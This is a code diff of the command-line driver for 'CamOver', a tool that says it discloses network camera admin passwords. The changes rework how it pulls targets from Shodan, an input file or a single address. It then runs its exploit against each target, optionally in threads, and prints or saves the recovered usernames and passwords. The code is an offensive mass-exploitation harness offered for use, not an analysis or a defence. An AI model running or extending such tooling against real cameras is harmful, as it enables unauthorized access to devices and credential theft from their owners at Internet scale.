@@ -24,16 +24,20 @@
 # SOFTWARE.
 #
 
+import os
 import argparse
 import threading
 
 from shodan import Shodan
+from time import sleep as thread_delay
 
 from .__main__ import CamOver
 from .badges import Badges
 
 
 class CamOverCLI(CamOver, Badges):
+    thread_delay = 0.1
+
     description = "CamOver is a camera exploitation tool that allows to disclosure network camera admin password."
     parser = argparse.ArgumentParser(description=description)
     parser.add_argument('-t', '--threads', dest='threads', action='store_true', help='Use threads for fastest work.')
@@ -43,34 +47,24 @@ class CamOverCLI(CamOver, Badges):
     parser.add_argument('--api', dest='api', help='Shodan API key for exploiting devices over Internet.')
     args = parser.parse_args()
 
-    def hack(self, host):
-        self.print_process(f"({host}) - connecting to camera...")
-        response = self.connect(host)
+    def thread(self, address):
+        result = self.exploit(address)
 
-        if response is not None:
-            self.print_process(f"({host}) - accessing camera config...")
-            password = self.exploit(response)
-
-            if password is not None:
-                self.print_process(f"({host}) - extracting admin password...")
-                return f"({host}) - password: {password}"
-            self.print_error(f"({host}) - config access denied!")
-            return None
-        self.print_error(f"({host}) - connection rejected!")
-        return None
-
-    def thread(self, number, host):
-        self.print_process(f"Initializing thread #{str(number)}...")
-        result = self.hack(host)
         if result:
+            result = f"({address}) - {result[0]}:{result[1]}"
             if not self.args.output:
                 self.print_success(result)
             else:
                 with open(self.args.output, 'a') as f:
                     f.write(f"{result}\n")
-        self.print_information(f"Thread #{str(number)} completed.")
-        
+
     def start(self):
+        line = "/-\|"
+        counter = 0
+
+        if self.args.threads:
+            threads = list()
+
         if self.args.api:
             self.print_process("Authorizing Shodan by given API key...")
             try:
@@ -83,47 +77,63 @@ class CamOverCLI(CamOver, Badges):
                 self.print_error("Failed to authorize Shodan!")
                 return
             self.print_success("Authorization successfully completed!")
-            counter = 0
+
             for address in addresses:
+                if counter >= len(line):
+                    counter = 0
+                self.print_process(f"Exploiting... ({address}) {line[counter]}")
+
                 if not self.args.threads:
-                    result = hack(address)
-                    if result:
-                        if not self.args.output:
-                            self.print_success(result)
-                        else:
-                            with open(self.args.output, 'a') as f:
-                                f.write(f"{result}\n")
+                    self.thread(address)
                 else:
-                    process = threading.Thread(target=self.thread, args=[counter, address])
-                    process.start()
+                    thread_delay(self.thread_delay)
+                    thread = threading.Thread(target=self.thread, args=[address])
+
+                    thread.start()
+                    threads.append(thread)
                 counter += 1
-        if self.args.input:
+
+        elif self.args.input:
+            if not os.path.exists(self.args.input):
+                self.print_error(f"Input file: {self.args.input}: does not exist!")
+                return
+
             with open(self.args.input, 'r') as f:
-                lines = f.read().strip().split('\n')
-                line_number = 0
-                for line in lines:
+                addresses = f.read().strip().split('\n')
+
+                for address in addresses:
+                    if counter >= len(line):
+                        counter = 0
+                    self.print_process(f"Exploiting... ({address}) {line[counter]}", end='')
+
                     if not self.args.threads:
-                        result = self.hack(line)
-                        if result:
-                            if not self.args.output:
-                                self.print_success(result)
-                            else:
-                                with open(self.args.output, 'a') as f:
-                                    f.write(f"{result}\n")
+                        self.thread(address)
                     else:
-                        process = threading.Thread(target=self.thread, args=[line_number, line])
-                        process.start()
-                    line_number += 1
+                        thread_delay(self.thread_delay)
+                        thread = threading.Thread(target=self.thread, args=[address])
+
+                        thread.start()
+                        threads.append(thread)
+                    counter += 1
+
         elif self.args.address:
-            result = self.hack(self.args.address)
-            if result:
-                if not self.args.output:
-                    self.print_success(result)
-                else:
-                    with open(self.args.output, 'a') as f:
-                        f.write(f"{result}\n")
+            self.print_process(f"Exploiting {self.args.address}...")
+            self.thread(self.args.address)
         else:
             self.parser.print_help()
+
+        if self.args.threads:
+            counter = 0
+
+            for thread in threads:
+                if counter >= len(line):
+                    counter = 0
+                self.print_process(f"Cleaning up... {line[counter]}", end='')
+
+                if thread.is_alive():
+                    thread.join()
+                counter += 1
+        self.print_empty(end='')
 
 def main():
     cli = CamOverCLI()
